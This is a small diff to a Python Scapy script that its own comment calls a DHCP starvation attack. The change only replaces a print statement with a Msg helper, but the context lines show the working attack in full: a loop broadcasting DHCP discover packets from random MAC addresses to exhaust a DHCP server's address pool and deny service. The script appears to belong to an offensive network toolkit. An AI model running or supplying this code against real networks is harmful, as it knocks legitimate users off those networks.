@@ -1,4 +1,5 @@
 from scapy.all import *
+from util import Msg
 
 #
 # DHCP starvation attack involves firing off DHCP request packets with random MAC addresses.  With this we can 
@@ -16,4 +17,4 @@ def initialize():
 		pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12, '0123456789abcdef'))/DHCP(options=[("message-type",'discover'),'end'])
 		sendp(pkt, loop=1)
 	except KeyboardInterrupt,Exception:
-		print '[!] Shutting down DoS...'
+		Msg('[!] Shutting down DoS...')
